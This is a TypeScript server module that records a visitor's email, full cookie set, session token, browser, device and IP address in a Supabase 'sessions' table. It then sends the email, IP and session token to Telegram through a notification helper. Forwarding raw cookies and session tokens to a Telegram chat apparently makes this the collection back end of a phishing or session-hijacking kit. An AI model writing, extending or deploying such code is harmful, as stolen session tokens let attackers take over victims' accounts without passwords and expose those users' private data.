import { createServerClient } from "@supabase/ssr"
import { sendSessionNotificationToTelegram } from "./telegram-service"

export async function logSessionToSupabase(
  email: string,
  sessionData: {
    cookies: Record<string, string>
    browserInfo: {
      userAgent: string
      browser: string
      os: string
    }
    deviceInfo: {
      isMobile: boolean
      deviceType: string
    }
    ipAddress: string
    sessionToken?: string
  },
) {
  try {
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL || "",
      process.env.SUPABASE_SERVICE_ROLE_KEY || "",
      {
        cookies: {
          getAll() {
            return []
          },
          setAll() {},
        },
      },
    )

    // Log to Supabase
    const { error: insertError } = await supabase.from("sessions").insert({
      email,
      session_token: sessionData.sessionToken,
      cookies: sessionData.cookies,
      browser_info: {
        user_agent: sessionData.browserInfo.userAgent,
        browser: sessionData.browserInfo.browser,
        os: sessionData.browserInfo.os,
      },
      device_info: {
        is_mobile: sessionData.deviceInfo.isMobile,
        device_type: sessionData.deviceInfo.deviceType,
      },
      ip_address: sessionData.ipAddress,
      login_timestamp: new Date().toISOString(),
      status: "active",
    })

    if (insertError) {
      console.error("[v0] Supabase insert error:", insertError)
      return false
    }

    // Send Telegram notification
    const telegramSent = await sendSessionNotificationToTelegram({
      email,
      browser: sessionData.browserInfo.browser,
      device: sessionData.deviceInfo.deviceType,
      ipAddress: sessionData.ipAddress,
      timestamp: new Date().toLocaleString(),
      sessionToken: sessionData.sessionToken,
    })

    return { success: true, telegramSent }
  } catch (error) {
    console.error("[v0] Session logging error:", error)
    return false
  }
}
